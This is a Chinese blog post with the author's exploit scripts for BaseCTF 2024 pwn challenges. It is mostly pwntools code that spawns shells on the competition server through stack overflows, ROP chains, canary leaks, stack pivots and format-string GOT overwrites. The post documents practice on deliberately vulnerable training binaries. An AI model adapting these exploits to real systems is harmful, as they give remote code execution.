---
title: pwn(一)-2024basectf复现
cover: rgb(117,117,255)
date: 2025-01-10 12:00:00
categories: 技术分享
tags:
  - 网安
  - pwn
---

个人向exp,因为是暑假打的，后面复现的比较烦躁，所以不算wp大多都是只有exp。

## 签到：

nc链接

cat flag

## 只有echo

```shell
echo "$( <flag)"#可以把flag文件打出来
```

## ret2text

```python
from pwn import *
import time
#p=process("/home/feeling/ctf/exam/pwn1")
p=remote("gz.imxbt.cn",20295)
pay=b"A"*(0x20+8)+ p64(0x401130)+p64(0x4011a4)
p.sendline(pay)
p.interactive()
```

## 失去她了

ret2system

```python
from pwn import *
import time
#p=process("/home/feeling/ctf/exam/pwn1")
p=remote("gz.imxbt.cn",20296)
context.log_level="debug"
shell=p64(0x401080)
binsh=p64(0x402008)
ret=p64(0x40124A)
rdi=p64(0x401196)
pay=b"A"*(0x70+8)+rdi+binsh+ret+shell
p.sendline(pay)
p.interactive()
```

## 彻底失去她

```python
io=remote("gz.imxbt.cn",20308)
elf = ELF("/home/feeling/ctf/pwn/彻底失去她")
pop_rdi_addr = 0x401196
pop_ret = 0x40101a
# gdb.attach(io,'b *0x401259')
puts = elf.plt["puts"]
io.recvuntil(b"me your name?\n")
payload = b"a" * 0x12 + p64(pop_rdi_addr) + p64(elf.got["puts"]) + p64(puts) + p64(pop_rdi_addr) + p64(elf.got["read"]) + p64(puts)+ p64(0x401214)
io.sendline(payload)
puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(f"---------{hex(puts_addr)}")
print(f"---------{hex(read_addr)}")
libc_base = puts_addr - 0x80e50
system_addr = elf.plt["system"]
bin_sh_addr = libc_base +     0x1d8678
payload= b'a' * 0x12+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)
io.sendline(payload)
io.interactive()
```

## fmt格式化字符串

任意地址写

```python
from pwn import *
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = remote('gz.imxbt.cn',20317)
payload=flat(b'%8$s')
p.send(payload)
p.interactive()
```

## shellcode-v0

没有想到，直接0x后面两位也可以跳转。相对栈上的跳转

```python
from pwn import *
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.arch = 'amd64'
p = remote('gz.imxbt.cn',20323)
shellcode=asm(shellcraft.amd64.sh())
payload=shellcode.ljust(0x18,b'a')+p64(0x10)
p.sendline(shellcode)
p.interactive()
```

## shellcode-v1

```python
from pwn import *
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context(arch='amd64')
p = remote('gz.imxbt.cn',20340)
shellcode=asm(shellcraft.sh())

system=b"\x0f\x05"
p.send(system)

payload=b"\x90\x90"+shellcode
p.sendline(payload)
p.interactive()
```

## format_string_level1

```python
from pwn import *
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context(arch='amd64')
p = remote('gz.imxbt.cn',20405)
shellcode=asm(shellcraft.sh())
daniu = 0x4040B0#目标地址
payload = fmtstr_payload(6,{daniu:1})#7是偏移量，6是写入的值
p.sendline(payload)
p.interactive()
```

## gift

```shell
ROPgadget --binary pwn --ropchain
#上面是工具的自带生成rop工具 pwn是文件名
#利用这个生成的rop来写payload
```

一把梭

```python
from pwn import *
from struct import pack
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context(arch='amd64')
io = remote('gz.imxbt.cn',20409)
p = b''
p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000419484) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000043d350) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401f2f) # pop rdi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000409f9e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000047f2eb) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x000000000043d350) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000471350) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401ce4) # syscall
payload=b'a'*(0x20+8)+p
io.sendline(payload)
io.interactive()
```

## 为什么不让我栈溢出

canary保护

```python
from pwn import *
from struct import pack
#context(arch='amd64', os='linux', log_level='debug')
back=0x4011b6
io = remote('gz.imxbt.cn', 20429)
pay1= b'a'*(0x70-8+1)
io.send(pay1)
io.recvuntil(b'a'*0x68)
canary= u64(io.recv(8))-0x61
print(hex(canary))
payload=b'a'*0x68+p64(canary)+b'b'*8+p64(0x40101a)+p64(back)
io.sendline(payload)
io.interactive()         # 进入交互模式
```

## stack in stack

```python
from pwn import *
from struct import pack

# 连接远程服务或本地服务
p = remote('gz.imxbt.cn', 20880)
elf = ELF("/home/feeling/ctf/pwn/閫夋墜闄勪欢/attachment")
libc = ELF("/home/feeling/ctf/pwn/閫夋墜闄勪欢/libc.so.6")

# 等待程序输出提示
p.recvuntil(b'mick0960.\n')

# 泄露堆栈缓冲区地址
buf_addr = int(p.recv(14), 16)
log.success("buf addr --> {}".format(hex(buf_addr)))

# 构造 ROP 相关地址
seceret = 0x4011dd  # 跳过 'push rbp' 对齐栈
main = 0x40124a     # 主函数的起始地址
leave = 0x00000000004012f2  # 'leave; ret' 指令地址

# 构造初始 payload
payload = b""
payload += p64(0)              # 填充空数据
payload += p64(seceret)        # 指定跳转地址
payload += p64(0)              # 填充空数据
payload += p64(main)           # 返回到 main 函数
payload += p64(0) * 2          # 填充对齐栈帧
payload += p64(buf_addr)       # 设置栈帧起始地址
payload += p64(leave)          # 跳转到 leave 指令

# 发送 Payload
p.send(payload)

# 泄露 libc 地址
p.recvuntil(b'0x')
libc_base = int(p.recv(12), 16) - libc.sym.puts
log.success("libc base --> {}".format(hex(libc_base)))

# 再次泄露堆栈缓冲区地址
p.recvuntil(b'mick0960.\n')
buf_addr = int(p.recv(14), 16)
log.success("buf addr --> {}".format(hex(buf_addr)))

# 计算 libc 中关键函数和地址
system = libc_base + libc.sym.system              # system 函数地址
binsh = libc_base + next(libc.search(b'/bin/sh')) # "/bin/sh" 字符串地址
pop_rdi = libc_base + 0x000000000002a3e5          # "pop rdi; ret" 地址
ret = 0x000000000040101a                          # "ret" 指令地址，用于对齐栈

# 构造第二次 payload
payload = b""
payload += p64(0)             # 填充空数据
payload += p64(ret)           # 栈对齐
payload += p64(pop_rdi)       # 设置 RDI 寄存器
payload += p64(binsh)         # "/bin/sh" 地址
payload += p64(system)        # 调用 system("/bin/sh")
payload += p64(0)             # 填充空数据
payload += p64(buf_addr)      # 设置新的栈帧地址
payload += p64(leave)         # 跳转到 leave 指令

# 发送 Payload
p.send(payload)

# 进入交互模式，获取 shell
p.interactive()
```

## fmt-2

### 代码解释

#### 1. 泄露 `printf` 地址

通过格式化字符串漏洞 `%7$s`，泄露 `printf` 的 GOT 表地址。接收返回值后，对齐到 8 字节并转换为整数，计算 libc 基址。

#### 2. 计算 `system` 的地址

利用泄露的 `libc` 基址和 `libc.sym['system']` 偏移，计算出 `system` 的实际地址。

#### 3. 构造格式化字符串覆盖 GOT 表

- 分别覆盖 `printf` 的 GOT 表的低字节、中字节、高字节。
- 使用 `%hhn` 来逐字节写入。
- 为了对齐 `printf_got` 的地址，填充 payload 到合适的长度。

#### 4. 执行 `system("/bin/sh")`

覆盖 `printf` 的 GOT 表后，程序调用 `printf` 时实际上会执行 `system`，传入参数为 `/bin/sh`，从而得到一个交互式 shell。

```python
from pwn import *
import time

# 设置环境上下文
context(os='linux', arch='amd64', log_level='debug')

# 调试开关及远程信息
is_debug = 0
IP = "gz.imxbt.cn"
PORT = 20882

# 加载 ELF 和 libc 文件
elf = ELF('/home/feeling/ctf/pwn/format_string_level2')
libc = ELF('/home/feeling/ctf/pwn/閫夋墜闄勪欢/libc.so.6')

# 连接函数
if is_debug:
    p = process()  # 本地调试
else:
    p = remote(IP, PORT)  # 远程连接

# GOT 表地址
printf_got = 0x403308

# 第一步：泄露 printf 的地址
# 构造格式化字符串，读取 printf 的 GOT 表值
payload = b"%7$saaaa" + p64(printf_got)
time.sleep(0.3)
p.sendline(payload)

# 接收泄露的地址，并计算 libc 基址
print_addr = u64(p.recv(6).ljust(8, b'\x00'))  # 6 字节对齐到 8 字节
libc_base = print_addr - (0x7afb4e4606f0 - 0x7afb4e400000)
success(f"libc_base -> {hex(libc_base)}")

# 第二步：计算 system 的地址
system = libc_base + libc.sym['system']
success(f"system -> {hex(system)}")

# 第三步：构造格式化字符串覆盖 printf 的 GOT 表
# 将 system 的地址分成低字节、中字节、高字节，逐一写入 GOT 表
payload = b'%' + str(system & 0xff).encode() + b'c%11$hhn'  # 写入低字节
payload += b'%' + str(((system >> 8) & 0xff) + (0x100 - (system & 0xff))).encode() + b'c%12$hhn'  # 写入中字节
payload += b'%' + str(((system >> 16) & 0xff) + (0x100 - ((system >> 8) & 0xff))).encode() + b'c%13$hhn'  # 写入高字节

# 填充 payload，使得后续的地址对齐
payload = payload.ljust(40, b'a')  # 填充对齐
payload += p64(printf_got)        # GOT 表地址
payload += p64(printf_got + 1)    # 第二字节地址
payload += p64(printf_got + 2)    # 第三字节地址

# 发送 payload
p.send(payload)

# 第四步：执行 system("/bin/sh")
time.sleep(0.3)
p.send(b"/bin/sh\x00")  # 发送 "/bin/sh" 字符串

# 打开交互模式
p.interactive()
```

## pie

```python
from pwn import *
import time

# 设置环境上下文
context(os='linux', arch='amd64', log_level='debug')

# 调试开关及远程信息
is_debug = 0
IP = "gz.imxbt.cn"
PORT = 20240

# 加载 ELF 和 libc 文件
elf = ELF('/home/feeling/ctf/pwn/题目附件/vuln')
libc = ELF('/home/feeling/ctf/pwn/题目附件/libc.so.6')

# 连接函数
if is_debug:
    p = process()  # 本地调试
else:
    p = remote(IP, PORT)  # 远程连接

# 构造第一阶段的payload以泄露libc地址
payload = b"a" * 0x108 + b'\x89'
p.send(payload)
p.recvuntil(b"a" * 0x108)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - (0x72c545629d89 - 0x72c545600000)
print(f"泄露的libc基地址: {hex(libc_base)}")

# 计算重要地址
pop_rdi_ret = libc_base + 0x000000000002a3e5
xor_rax_rax_ret = libc_base + 0x00000000000baaf9
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# 构造第二阶段的payload以执行/bin/sh
payload = b"a" * 0x108 + p64(pop_rdi_ret) + p64(binsh) + p64(xor_rax_rax_ret) + p64(system)
p.send(payload)

# 与目标交互
p.interactive()
```

## 五子棋

ida先看看文件，一大段没什么意思，我们找找有趣的，给了shell可以找找shell函数的获取方式。

在主函数下的一个函数中，一个变量key<=2就可以getshell，接着可以查看key的交叉引用看看怎么和作者玩游戏。

关键位置就是在两次之内给他win了，下方有个++key

接下来就是通过计算达成break跳出游戏循环，getshell了

exp如下：

```python
from pwn import *
io = remote("gz.imxbt.cn",20225)
pay1=b'1 1'
pay2=b'-298 -5'
io.sendline(pay1)
io.sendline(pay2)
io.interactive()
```

## ezstack：

ret2csu经典

```python
from pwn import*
p=remote('gz.imxbt.cn',20710)
pop_rdi=0x00000000004006f3
pop_rbx_rbp_r12_r13_r14_r15=0x4006ea
magic=0x400658
offset=-0x30880
setvbuf_got=0x601020
gets_plt=0x4004F0
setvbuf_plt=0x400500
bss=0x601080
 
 
payload=b'a'*0x10+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(offset&0xffffffffffffffff)+p64(setvbuf_got+0x3d)+p64(0)*4+p64(magic)
payload+=p64(pop_rdi)+p64(bss)+p64(gets_plt)
payload+=p64(pop_rdi)+p64(bss)+p64(setvbuf_plt)
p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()
```

## fmt-level3：

```python
from pwn import*

p=remote('gz.imxbt.cn',20711)
libc=ELF('/home/feeling/ctf/pwn/format_string_level3/libc.so.6')
elf=ELF('/home/feeling/ctf/pwn/format_string_level3/vuln')
main=0x40121B
stack_fail=0x403320
puts_got=0x403318
read_got=0x403330
printf_got=0x403328
 
payload=b'%'+str((main&0xff)).encode()+b'c%10$hhn'+b'%'+str((main>>8&0xffff)-(main&0xff)).encode()+b'c%11$hn'
payload=payload.ljust(0x20,b'\x00')
payload+=p64(stack_fail)+p64(stack_fail+1)
payload=payload.ljust(0x10f,b'a')
p.sendline(payload)
payload=b'aaaa%7$s'+p64(puts_got)
payload=payload.ljust(0x10f,b'a')
p.sendline(payload)

puts_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

libcbase=puts_addr-libc.sym['puts']
system=libcbase+libc.sym['system']
binsh=libcbase+next(libc.search(b'/bin/sh'))
payload=b'%'+str((system&0xff)).encode()+b'c%10$hhn'+b'%'+str((system>>8&0xffff)-(system&0xff)).encode()+b'c%11$hn'
payload=payload.ljust(0x20,b'\x00')
payload+=p64(printf_got)+p64(printf_got+1)
payload=payload.ljust(0x10f,b'a')

p.sendline(payload)
payload=b'/bin/sh'
p.sendline(payload)
p.interactive()
```

